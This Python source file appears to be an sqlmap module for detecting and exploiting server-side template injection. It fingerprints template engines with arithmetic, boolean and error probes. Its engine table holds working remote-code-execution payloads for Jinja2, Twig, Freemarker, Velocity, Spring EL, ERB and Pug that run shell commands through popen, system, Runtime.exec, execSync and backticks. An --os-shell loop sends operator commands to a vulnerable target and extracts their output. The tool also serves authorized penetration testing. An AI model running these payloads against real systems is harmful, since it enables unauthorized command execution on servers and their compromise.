#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import SSTI_ERROR_SIGNATURES
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request


SENTINEL = randomStr(length=10, lowercase=True)

SSTI_PLACES = (PLACE.GET, PLACE.POST, PLACE.COOKIE, PLACE.CUSTOM_POST)

# Each Engine entry defines detection payloads and expected behaviour for one
# template engine.  Arithmetic fields use %d placeholders filled with randomInt()
# at probe time so a static "49" on the page cannot produce a false positive.
# Engines are listed in detection-priority order.
Engine = namedtuple("Engine", (
    "name",             # human-readable engine name
    "family",           # language family (python, php, java, ruby, nodejs)
    "delimiter",        # expression delimiter opening (e.g. "{{")
    "delimiterClose",   # expression delimiter closing (e.g. "}}")
    "errorRegex",       # combined engine-specific error regex (None for "no specific signature")
    "errorProbes",      # tuple of malformed payload suffixes that trigger engine errors
    "arithmeticFmt",    # arithmetic proof with two %d placeholders (e.g. "{{ %d*%d }}"), or ""
    "arithmeticUnescapedFmt",  # same with escape bypass (e.g. "{{ (%d*%d)|safe }}"), or ""
    "booleanTrue",      # boolean true payload
    "booleanFalse",     # boolean false payload
    "trueRendered",     # what true renders as (for response matching)
    "falseRendered",    # what false renders as
    "distinguishingProbe",  # cross-engine disambiguation probe (None if n/a)
    "distinguishingResult", # expected substring from disambiguation probe
    "expressionFmt",        # format string for wrapping expressions (e.g. "{{ %s }}"), or ""
    "rcePayloads",          # tuple of (payload_template, description) with {CMD} for command, or ()
))


def _arithmeticPayload(fmt, a, b):
    return fmt % (a, b)


_ENGINE_TABLE = (
    # -- Python -------------------------------------------------------------------------------------------
    Engine("Jinja2", "python",
           "{{", "}}",
           r"(?i)(?:jinja2\.exceptions\.\w+|TemplateSyntaxError|UndefinedError|TemplateNotFound|TemplateAssertionError)",
           ("{{", "{{ }}", "{{ unknown|filter }}"),
           "{{ %d*%d }}", "{{ (%d*%d)|safe }}",
           "{{ True }}", "{{ False }}", "True", "False",
           None, None,  # Jinja2/Twig distinguished by trueRendered ("True"/"False" vs "1"/"")
           "{{ %s }}",
           # Jinja2: try multiple RCE paths in order (cycler -> config -> lipsum)
           (("{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}", "cycler.__globals__"),
            ("{{ config.from_envvar.__globals__.__builtins__.__import__('os').popen('{CMD}').read() }}", "config.from_envvar chain"),
            ("{{ lipsum.__globals__.os.popen('{CMD}').read() }}", "lipsum.__globals__"))),
    # -- PHP ----------------------------------------------------------------------------------------------
    Engine("Twig", "php",
           "{{", "}}",
           r"(?i)(?:Twig[\\_]Error|Twig[\\_]Environment|syntax error, unexpected|Unknown (?:filter|function|test|tag))",
           ("{{", "{{ }}", "{{ unknown|filter }}"),
           "{{ %d*%d }}", "{{ (%d*%d)|raw }}",
           "{{ true }}", "{{ false }}", "1", "",
           "{{ _self }}", "Twig_Template",
           "{{ %s }}",
           # Twig: try system -> exec -> shell_exec fallbacks
           (("{{ ['{CMD}']|filter('system') }}", "filter('system')"),
            ("{{ ['{CMD}']|filter('exec') }}", "filter('exec')"),
            ("{{ ['{CMD}']|filter('shell_exec') }}", "filter('shell_exec')"))),
    # -- Java ---------------------------------------------------------------------------------------------
    Engine("Freemarker", "java",
           "${", "}",
           r"(?i)(?:freemarker\.(?:core|template|extract|cache)\.\w+|ParseException|InvalidReferenceException|TemplateException)",
           ("${", "${}", "<#if ", "<#--"),
           "${%d*%d}", "${(%d*%d)?no_esc}",
           "${true}", "${false}", "true", "false",
           "<#-- freemarker -->", "",
           "${%s}",
           # Freemarker: classic -> indirect-assign fallback
           (("${'freemarker.template.utility.Execute'?new()('{CMD}')}", "Execute?new"),
            ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{CMD}')}", "assign+new"))),
    Engine("Velocity", "java",
           "$", "",
           r"(?i)(?:org\.apache\.velocity\.(?:runtime|exception)\.\w+|ParseErrorException|MethodInvocationException|ResourceNotFoundException)",
           ("$", "#if(", "#set($x=)"),
           "", "",
           "#if(true) TRUE #end", "#if(false) TRUE #else FALSE #end", "TRUE", "FALSE",
           "#* velocity *#", "",
           "",  # no generic expression wrapper
           # Velocity: full reflection chain (pre-2.3 only; patched by CVE-2020-13936)
           (("#set($str=$class.inspect('java.lang.String').type)\n"
             "#set($chr=$class.inspect('java.lang.Character').type)\n"
             "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}'))\n"
             "$ex.waitFor()\n"
             "#set($out=$ex.getInputStream())\n"
             "#foreach($i in [1..$out.available()])\n"
             "$str.valueOf($chr.toChars($out.read()))\n"
             "#end", "reflection chain"),)),
    Engine("Spring EL / Thymeleaf", "java",
           "${", "}",
           r"(?i)(?:org\.springframework\.expression\.\w+|org\.thymeleaf\.\w+|SpelEvaluationException|TemplateProcessingException|ExpressionParsingException|ValidationFailedException)",
           ("${", "${}", "#{", "*{"),
           "${%d*%d}", "",
           "${true}", "${false}", "true", "false",
           "${#request}", "",
           "${%s}",
           (("${T(java.lang.Runtime).getRuntime().exec('{CMD}')}", "T(Runtime).exec"),)),
    # -- Ruby ---------------------------------------------------------------------------------------------
    Engine("ERB", "ruby",
           "<%=", "%>",
           r"(?i)(?:erb|SyntaxError|undefined local variable|no implicit conversion|wrong number of arguments|\(erb\):\d+)",
           ("<%=", "<%", "<%#", "<%= foo.unknown_method %>"),
           "<%= %d*%d %>", "<%= raw %d*%d %>",
           "<%= true %>", "<%= false %>", "true", "false",
           "<%= defined? Rails %>", "",
           "<%= %s %>",
           # ERB: backtick captures output; system() returns only exit status
           (("<%= `{CMD}` %>", "backtick"),)),
    # -- Node.js ------------------------------------------------------------------------------------------
    Engine("Pug/Jade", "nodejs",
           "#{", "}",
           r"(?i)(?:pug|jade|Cannot read propert|is not a function|TypeError|ReferenceError)",
           ("#{", "!{", "#{ }"),
           "#{%d*%d}", "!{%d*%d}",
           "#{true}", "#{false}", "true", "false",
           None, None,
           "#{%s}",
           (("#{global.process.mainModule.require('child_process').execSync('{CMD}')}", "execSync"),)),
    Engine("Handlebars", "nodejs",
           "{{", "}}",
           r"(?i)(?:handlebars|Handlebars|Parse error on line|\{\{[\w.]+\}\})",
           ("{{", "{{#if}}", "{{/each}}"),
           "", "",
           "{{#if true}}yes{{/if}}", "{{#if false}}yes{{/if}}", "yes", "",
           None, None,
           "",  # no generic expression wrapper without registered helpers
           ()),  # RCE requires pre-registered helpers; not generically exploitable
)


def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()


def _delim(place):
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'


def _confParameters(place):
    try:
        return conf.parameters.get(place, "")
    except AttributeError:
        return conf.parameters[place] if place in conf.parameters else ""


def _originalValue(place, parameter):
    for segment in _confParameters(place).split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""


def _replaceSegment(place, parameter, value):
    delimiter = _delim(place)
    raw = _confParameters(place)
    retVal, replaced = [], False

    for part in raw.split(delimiter):
        name, _, _ = part.partition('=')
        if not replaced and name.strip() == parameter:
            retVal.append("%s=%s" % (name, value))
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = []
        for name, oldValue in conf.paramDict.get(place, {}).items():
            retVal.append("%s=%s" % (name, value if name == parameter else oldValue))

    return delimiter.join(retVal)


def _send(place, parameter, value):
    """Issue a single HTTP request with the target parameter set to `value`.
    Temporarily mutates conf.parameters so sqlmap's normal request machinery
    (URL construction, cookies, headers, encodings) is fully preserved."""

    if conf.delay:
        time.sleep(conf.delay)

    old_params = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, value)

    try:
        kwargs = {"raise404": False, "silent": True}
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, _ = Request.getPage(**kwargs)
        return page or ""
    except Exception as ex:
        logger.debug("SSTI probe request failed: %s" % getUnicode(ex))
        return ""
    finally:
        conf.parameters[place] = old_params


def _isError(page, engine):
    if not engine.errorRegex:
        return False
    return bool(re.search(engine.errorRegex, getUnicode(page or "")))


def _backendFromError(page):
    page = getUnicode(page or "")
    for name, regex in SSTI_ERROR_SIGNATURES:
        if re.search(regex, page):
            return name
    return None


def _boolean(truthy, falsy):
    """Return the reproducible true page when true/false probes diverge.
    Both true AND false pages must be independently reproducible."""

    truePage = truthy()
    if truePage is None:
        return None

    truePage2 = truthy()
    if _ratio(truePage, truePage2) < UPPER_RATIO_BOUND:
        return None

    falsePage = falsy()
    if falsePage is None:
        return None

    falsePage2 = falsy()
    if _ratio(falsePage, falsePage2) < UPPER_RATIO_BOUND:
        return None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage

    return None


def _probeArithmetic(place, parameter, engine):
    """Inject a random arithmetic expression and its control pair (different
    operands, different result).  Both results must appear for their respective
    payloads and NOT bleed across, proving the template is executing the expression
    rather than a static '49' appearing on the page by coincidence."""

    if not engine.arithmeticFmt:
        return False

    original = _originalValue(place, parameter) or ""
    a, b = randomInt(3), randomInt(3)
    c = b + 1  # different operand -> different result

    result1 = str(a * b)
    result2 = str(a * c)

    for fmt in (engine.arithmeticFmt, engine.arithmeticUnescapedFmt):
        if not fmt:
            continue

        try:
            p1 = original + _arithmeticPayload(fmt, a, b)
            p2 = original + _arithmeticPayload(fmt, a, c)
        except (ValueError, TypeError):
            logger.debug("SSTI arithmetic: format failed for engine '%s' with fmt=%r" % (engine.name, fmt))
            continue

        page1 = _send(place, parameter, p1)
        page2 = _send(place, parameter, p2)

        if not page1 or not page2:
            continue

        text1 = getUnicode(page1)
        text2 = getUnicode(page2)

        # Raw payload reflection means the template did NOT execute
        if p1 in text1 or p2 in text2:
            continue

        # Each result must appear in its own response and NOT in the other
        if result1 in text1 and result2 not in text1 and result2 in text2 and result1 not in text2:
            return True

    return False


def _probeError(place, parameter, engine):
    """Inject each error probe suffix and check for engine-specific error messages."""
    if not engine.errorRegex or not engine.errorProbes:
        return None

    original = _originalValue(place, parameter) or ""

    for probe in engine.errorProbes:
        payload = original + probe
        page = _send(place, parameter, payload)
        if not page:
            continue
        if _isError(page, engine):
            return page
    return None


def _probeDistinguishing(place, parameter, engine):
    """Send the engine-specific fingerprint probe and verify the response.
    For probes with a non-empty expected result, the result must appear and the
    raw probe must NOT be reflected verbatim.
    For empty-result (comment-style) probes, the response must stay similar to
    baseline and the probe must NOT appear in the output."""

    if not engine.distinguishingProbe:
        return False

    original = _originalValue(place, parameter) or ""
    probe = engine.distinguishingProbe
    page = _send(place, parameter, original + probe)
    if page is None:
        return False

    text = getUnicode(page)

    # Reject raw reflection: if the probe appears verbatim, the template didn't execute it
    if probe in text:
        return False

    if engine.distinguishingResult:
        return engine.distinguishingResult in text

    # Empty-result (comment-style) probe: response must stay similar to baseline
    baseline = _send(place, parameter, original)
    return _ratio(page, baseline) >= UPPER_RATIO_BOUND


def _detectBoolean(place, parameter, engine):
    """Establish a boolean oracle for this engine. Returns the true template or None."""
    original = _originalValue(place, parameter) or ""

    truePayload = original + engine.booleanTrue
    falsePayload = original + engine.booleanFalse

    if engine.trueRendered:
        truePage = _send(place, parameter, truePayload)
        if not truePage:
            return None
        text = getUnicode(truePage)
        if truePayload in text or engine.trueRendered not in text:
            return None

    # Reject reflected false payload
    falsePage = _send(place, parameter, falsePayload)
    if falsePage and falsePayload in getUnicode(falsePage):
        return None

    return _boolean(lambda p=truePayload: _send(place, parameter, p),
                    lambda p=falsePayload: _send(place, parameter, p))


def _booleanUniquelyIdentifies(engine):
    """Returns True when the engine's boolean rendering signature is unique
    among all engines sharing the same delimiter, allowing exact naming."""
    siblings = [e for e in _ENGINE_TABLE if e.delimiter == engine.delimiter]
    signature = (engine.booleanTrue, engine.booleanFalse,
                 engine.trueRendered, engine.falseRendered)
    count = sum((e.booleanTrue, e.booleanFalse,
                 e.trueRendered, e.falseRendered) == signature for e in siblings)
    return count == 1


def _fingerprint(place, parameter):
    """Identify the template engine and confirm injection. Returns (engine, evidence)
    where evidence is a dict of detection results, or (None, None).

    Scoring: arithmetic(3) + boolean(2) + error(1) + distinguishing(2).
    Engines sharing delimiters require error, distinguishing, or unique boolean
    rendering evidence to be named exactly; otherwise they are reported as family/probable."""

    bestEngine = None
    bestEvidence = None
    bestScore = 0

    for engine in _ENGINE_TABLE:
        evidence = {}
        score = 0

        # Phase 1: Arithmetic in-band proof with control pair (strongest)
        if _probeArithmetic(place, parameter, engine):
            evidence["arithmetic"] = True
            score += 3

        # Phase 2: Boolean oracle
        if _detectBoolean(place, parameter, engine):
            evidence["boolean"] = True
            score += 2

        # Phase 3: Error-based fingerprinting
        errorPage = _probeError(place, parameter, engine)
        if errorPage is not None:
            if _isError(errorPage, engine):
                evidence["error"] = True
                score += 1

        # Phase 4: Distinguishing probe (breaks ties within delimiter families)
        if _probeDistinguishing(place, parameter, engine):
            evidence["distinguishing"] = True
            score += 2

        if score > bestScore:
            bestScore = score
            bestEngine = engine
            bestEvidence = evidence

    if bestEngine and bestScore >= 3:
        # For engines with ambiguous delimiters (shared by multiple engines),
        # name a specific engine when: error fingerprint, distinguishing probe,
        # or boolean rendering is unique within the delimiter family.
        _FAMILY = {
            "{{": "Jinja2/Twig/Handlebars-like",
            "${": "Freemarker/SpringEL-like",
        }
        if bestEngine.delimiter in _FAMILY:
            if (bestEvidence.get("error") or
                bestEvidence.get("distinguishing") or
                (bestEvidence.get("boolean") and _booleanUniquelyIdentifies(bestEngine))):
                pass  # specific engine name stands
            else:
                bestEngine = bestEngine._replace(
                    name="%s (probable %s)" % (_FAMILY[bestEngine.delimiter], bestEngine.name))
        return bestEngine, bestEvidence

    # Fallback: generic error detection
    errorBackend = None
    for suffix in ("{{", "${", "<%=", "#{"):
        page = _send(place, parameter, _originalValue(place, parameter) + suffix)
        if page:
            backend = _backendFromError(page)
            if backend:
                errorBackend = backend
                break

    if errorBackend:
        for engine in _ENGINE_TABLE:
            if engine.name.lower() in errorBackend.lower():
                return engine, {"error": True}

    return None, None


def sstiScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    infoMsg = "'--ssti' is self-contained: it detects SSTI and fingerprints "
    infoMsg += "common template engines when possible. SQL enumeration "
    infoMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
    logger.info(infoMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = 0
    found = []

    for place in (_ for _ in SSTI_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing SSTI on %s parameter '%s'" % (place, parameter))

            engine, evidence = _fingerprint(place, parameter)
            if engine:
                found.append((place, parameter, engine, evidence))
                logger.info("%s parameter '%s' is vulnerable to SSTI (back-end: '%s')" % (place, parameter, engine.name))
                if conf.beep:
                    beep()

                if engine.arithmeticFmt:
                    payload = _originalValue(place, parameter) + (engine.arithmeticFmt % (7, 7))
                else:
                    payload = _originalValue(place, parameter) + engine.booleanTrue
                title = "SSTI %s injection" % engine.name
                report = "---\nParameter: %s (%s)\n    Type: SSTI\n    Title: %s\n    Payload: %s=%s\n---" % (parameter, place, title, parameter, payload)
                conf.dumper.singleString(report)

                if evidence.get("arithmetic"):
                    logger.info("in-band arithmetic proof confirmed (control-pair)")
                if evidence.get("boolean"):
                    logger.info("boolean oracle confirmed")

    if not found:
        if tested:
            warnMsg = "no parameter appears to be injectable via SSTI (%d tested)" % tested
        else:
            warnMsg = "no parameters found to test for SSTI"
        logger.warning(warnMsg)
    else:
        engines = set(engine.name for _, _, engine, _ in found)
        if len(engines) == 1:
            logger.info("back-end template engine: '%s'" % engines.pop())
        else:
            logger.info("back-end template engines: %s" % ", ".join(sorted(engines)))

    if found:
        slot = found[0]
        place, parameter, engine, evidence = slot

        # --ssti-query: user-provided expression evaluated in-band
        if conf.get("sstiQuery"):
            _evalExpression(place, parameter, engine, conf.sstiQuery)

        # --ssti-shell: interactive expression evaluation loop
        if conf.get("sstiShell"):
            infoMsg = "calling SSTI shell. Enter expressions (e.g. 7*7) or 'exit'/'quit' to leave"
            logger.info(infoMsg)
            from lib.core.common import readInput
            while True:
                expr = readInput("ssti-shell> ")
                if not expr or expr.strip().lower() in ("exit", "quit"):
                    break
                _evalExpression(place, parameter, engine, expr.strip())

        # --os-cmd / --os-shell: RCE via SSTI (reuses existing SQL takeover flags)
        if conf.get("osCmd") or conf.get("osShell"):
            if not _canTakeover(engine, evidence):
                logger.error("takeover requires exact engine fingerprint (got '%s') and "
                             "confirmed proof (arithmetic or boolean oracle)" % engine.name)
            else:
                if conf.get("osCmd"):
                    _executeCommand(place, parameter, engine, conf.osCmd)

                if conf.get("osShell"):
                    if conf.get("batch"):
                        logger.info("skipping interactive OS shell in batch mode")
                    else:
                        infoMsg = "calling SSTI OS shell. Enter commands or 'exit'/'quit' to leave"
                        logger.info(infoMsg)
                        from lib.core.common import readInput
                        while True:
                            cmd = readInput("os-shell> ")
                            if not cmd or cmd.strip().lower() in ("exit", "quit"):
                                break
                            _executeCommand(place, parameter, engine, cmd.strip())

    logger.info("SSTI scan complete")


def _escapeSingleQuoted(value):
    """Escape backslashes and single quotes for embedding in a single-quoted string."""
    return value.replace("\\", "\\\\").replace("'", "\\'")


def _evalExpression(place, parameter, engine, expr):
    """Wrap expr in the engine's expression format, extract result between
    random markers for deterministic output, fall back to baseline diff."""

    if not engine.expressionFmt:
        logger.error("expression evaluation not supported for engine '%s'" % engine.name)
        return

    original = _originalValue(place, parameter) or ""
    startMarker = randomStr(length=8, lowercase=True)
    endMarker = randomStr(length=8, lowercase=True)

    # Three-part payload: marker, expression, marker -- each in its own template tag
    # so the expression is evaluated independently of the markers
    payload = original + (engine.expressionFmt % ("'%s'" % startMarker))
    payload += " " + (engine.expressionFmt % expr)
    payload += " " + (engine.expressionFmt % ("'%s'" % endMarker))
    page = _send(place, parameter, payload)

    if not page:
        logger.warning("no response for SSTI expression '%s'" % expr)
        return

    text = getUnicode(page)
    result = None

    # Extract content between the random markers
    if startMarker in text and endMarker in text:
        start = text.index(startMarker) + len(startMarker)
        end = text.index(endMarker, start)
        result = text[start:end].strip()

    # Fallback: diff against baseline
    if not result:
        baseline = _send(place, parameter, original)
        if baseline:
            sm = difflib.SequenceMatcher(None, getUnicode(baseline), text)
            parts = []
            for tag, i1, i2, j1, j2 in sm.get_opcodes():
                if tag in ("insert", "replace"):
                    parts.append(text[j1:j2])
            if parts:
                result = "".join(parts).strip()

    if result:
        conf.dumper.singleString("SSTI expression result: %s" % result)
    else:
        logger.warning("could not extract expression result from response")


def _canTakeover(engine, evidence):
    """Require exact engine fingerprint (not a family guess) and confirmed
    proof before attempting OS command execution."""
    if not engine.rcePayloads:
        return False
    if "(probable" in engine.name or "-like" in engine.name:
        return False
    if not (evidence.get("arithmetic") or evidence.get("boolean")):
        return False
    return True


def _executeCommand(place, parameter, engine, cmd):
    """Execute an OS command via the engine's RCE payloads, trying each fallback
    in order until one produces output. Captures output via baseline diff."""

    safeCmd = _escapeSingleQuoted(cmd)
    original = _originalValue(place, parameter) or ""
    baseline = _send(place, parameter, original)

    for payloadTemplate, description in engine.rcePayloads:
        payload = payloadTemplate.replace("{CMD}", safeCmd)
        fullPayload = original + payload
        page = _send(place, parameter, fullPayload)

        if not page:
            continue

        # Skip error pages (payload caused a template exception, not a shell)
        if engine.errorRegex and _isError(page, engine):
            continue

        text = getUnicode(page)
        baseText = getUnicode(baseline or "")
        output = ""

        if baseText and text != baseText:
            sm = difflib.SequenceMatcher(None, baseText, text)
            opcodes = sm.get_opcodes()
            parts = []
            for tag, i1, i2, j1, j2 in opcodes:
                if tag in ("insert", "replace"):
                    parts.append(text[j1:j2])
            if parts:
                output = "".join(parts).strip()

        if not output:
            output = text
            if original and output.startswith(original):
                output = output[len(original):]
            output = output.strip()

        # Suppress when output is just the baseline with the original value removed
        # (command produced no output; the template rendered empty)
        # Filter out template error messages masquerading as command output
        if output and _ratio(output, baseText) < UPPER_RATIO_BOUND:
            if output != baseText.strip() and not (baseText and baseText.replace(original, "").strip() == output):
                conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, output))
                return

    logger.warning("no output received for OS command '%s' (tried %d payload(s))" % (cmd, len(engine.rcePayloads)))
